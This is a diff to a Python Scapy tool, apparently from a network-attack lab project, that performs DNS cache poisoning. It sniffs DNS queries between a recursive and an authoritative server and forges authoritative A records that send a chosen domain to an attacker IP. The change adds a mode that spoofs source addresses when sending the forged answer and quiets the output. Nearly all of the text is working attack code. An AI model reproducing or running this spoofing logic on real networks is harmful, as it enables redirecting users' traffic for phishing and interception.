@@ -9,6 +9,7 @@ from datetime import datetime
 class DnsPois:
 
     def __init__(self):
+        self.pois_vic_instead = False
         self.auth_ip = None
         self.rec_ip = None
         self.domain = None
@@ -20,13 +21,13 @@ class DnsPois:
         self.save = False
 
     @staticmethod
-    def responder(auth_ip, rec_ip, mal_ip, domain):
+    def responder(auth_ip, rec_ip, mal_ip, domain, poison_vic):
         """
         Forwards a packet to the original recipient if it is not a packet we wish to falsify
         """
 
         def forward(pkt):
-            send(pkt, verbose=1)
+            send(pkt, verbose=0)
 
         """
         Looks at a packet and decides whether it contains a DNS response for the domain we wish to spoof
@@ -36,30 +37,35 @@ class DnsPois:
 
         def get_resp(pkt):
 
-            # print(pkt.show())
-            print(domain)
-
             if DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 and str(pkt[IP].src) == rec_ip and \
                     str(pkt[IP].dst) == auth_ip:
 
-                if domain in str(pkt['DNS Question Record'].qname):
-                    spf_resp = IP(dst=pkt[IP].src, src=pkt[IP].dst) / UDP(dport=pkt[UDP].sport,
-                                                                          sport=pkt[UDP].dport) / DNS(
-                        id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, qdcount=1, rd=1, ancount=1, nscount=0, arcount=0,
+                if not poison_vic:
+                    if domain in str(pkt['DNS Question Record'].qname):
+                        spf_resp = IP(dst=pkt[IP].src, src=pkt[IP].dst) / UDP(dport=pkt[UDP].sport,
+                                                                              sport=pkt[UDP].dport) / DNS(
+                            id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, qdcount=1, rd=1, ancount=1, nscount=0, arcount=0,
+                            an=(DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=3600, rdata=mal_ip)))
+                        send(spf_resp, verbose=0)
+                        return "Spoofed DNS Response Sent " + str(pkt['DNS Question Record'].qname)
+                    else:
+                        return forward(pkt)
+                else:
+                    print(str(pkt['DNS Question Record'].qname))
+                    spf_resp = IP(dst=auth_ip, src=rec_ip) / UDP(dport=pkt[UDP].sport,
+                                                                 sport=pkt[UDP].dport) / DNS(
+                        id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, qdcount=1, rd=1, ancount=1, nscount=0,
+                        arcount=0,
                         an=(DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=3600, rdata=mal_ip)))
                     send(spf_resp, verbose=0)
-                    return "Spoofed DNS Response Sent " + str(pkt['DNS Question Record'].qname)
-                else:
-                    return forward(pkt)
             else:
                 return forward(pkt)
 
         return get_resp
 
-    def set(self, auth_dns, rec_dns, mal_dns, dom, save):
+    def set(self, auth_dns, rec_dns, mal_dns, dom, save, poison_vic):
         """
         Set all the information needed for a DNS cache poisoning attack
-
         :param auth_dns:
         :param rec_dns:
         :param mal_dns:
@@ -72,11 +78,11 @@ class DnsPois:
         self.rec_ip = rec_dns
         self.mal_ip = mal_dns
         self.save = save
+        self.pois_vic_instead = poison_vic
 
     def start(self):
         """
         Start the DNS cache poisoning attack
-
         :return:
         """
         print("domain: " + self.domain)
@@ -101,11 +107,10 @@ class DnsPois:
     def sniff(self):
         """
         Sniff the network with a stop_filter (@self.stopfilter)
-
         :return:
         """
         # TODO: Stop filter is not used so packet saving does not work
-        packets = sniff(prn=self.responder(self.auth_ip, self.rec_ip, self.mal_ip, self.domain))
+        packets = sniff(prn=self.responder(self.auth_ip, self.rec_ip, self.mal_ip, self.domain, self.pois_vic_instead))
         if self.save:
             name = str(datetime.now().time().strftime("%H_%M_%S")) + '_DNS_cache_poisoning.pcap'
             wrpcap('../pcap_files/' + name, packets)
@@ -113,7 +118,6 @@ class DnsPois:
     def stop_poisoning(self):
         """
         Stop ARP cache poisoning
-
         :return:
         """
         self.stop = True
@@ -122,7 +126,6 @@ class DnsPois:
     def stopfilter(self, x):
         """
         The stop filter
-
         :param x: a packet
         :return:
         """
